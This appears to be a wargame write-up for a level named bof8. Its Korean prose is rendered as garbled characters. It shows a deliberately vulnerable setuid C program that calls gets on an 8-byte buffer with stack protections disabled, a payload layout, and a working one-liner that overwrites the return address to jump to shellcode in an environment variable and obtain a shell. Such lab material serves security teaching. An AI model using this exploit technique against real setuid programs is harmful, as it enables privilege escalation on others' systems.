# bof8 ����

## bof8.c 
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define BUF_SIZE 8

// ASLR OFF
// STACK-PROTECTOR OFF
// STACK-EXECUTION ON

void vuln() {
    char buf[BUF_SIZE];

    if (setreuid(1008, 1008)) {
        perror("setuid");
        exit(1);
    }
    if (setregid(1008, 1008)) {
        perror("setgid");
        exit(1);
    }
    gets(buf);
    printf("Hello %s[%p]!\n", buf, buf);
    printf("(env:SHELLCODE -> %p)\n", getenv("SHELLCODE"));
}

int main() {
    vuln();
    return 0;
}
```

`buf` ���ڿ��� �Է� �޴� `gets` �Լ��� ������̴�.

---


## ���� ���

<br>

ȯ�溯�� `SHELLCODE`�� �����, Buffer Overflow �� �̿��� `vuln` �Լ��� Return Address �� ȯ�溯���� �ּҸ� ���� �� �ֵ��� �ϰ�, `ret` �� ����� �� shell code�� ����� �� �ֵ��� �����.

### ���̷ε�

| buf | SFP | RET |
| :--: | :--: | :--: |
| Dummy | Dummy | SHELLCODE Address | 
---

## ���

<br>


![bof8_1](img/bof8_1.png)

���� `SHELLCODE`��� ȯ�溯���� �����.
```c
 printf("(env:SHELLCODE -> %p)\n", getenv("SHELLCODE"));
```
�� �κп��� ȯ�溯���� �ּҸ� �˷��ش�.

<br>

![bof8_2](img/bof8_2.png)

Buffer Overflow �� ����� Return Address �� ������ �Ϸ��� �ϴµ� `buf`�� ũ�Ⱑ 8, 64bit���� SFP�� ũ��� 8�̹Ƿ� Dummy ���� 16��ŭ �־� �� ���� `buf`�� �ּҸ� Ȯ���Ѵ�.

<br>

![bof8_3](img/bof8_3.png)

���̷ε忡 ���� ��ɾ �ۼ��ϸ� ������ ���� �ȴ�.
```shell
$ (python -c 'print "a"*16+"\x65\xee\xff\xff\xff\x7f"'; cat) | ./bof8
```
�� ��ɾ �Է��ϸ� �� ������ ���� Shell�� ���� �� ������ Ȯ���� �� �ִ�.
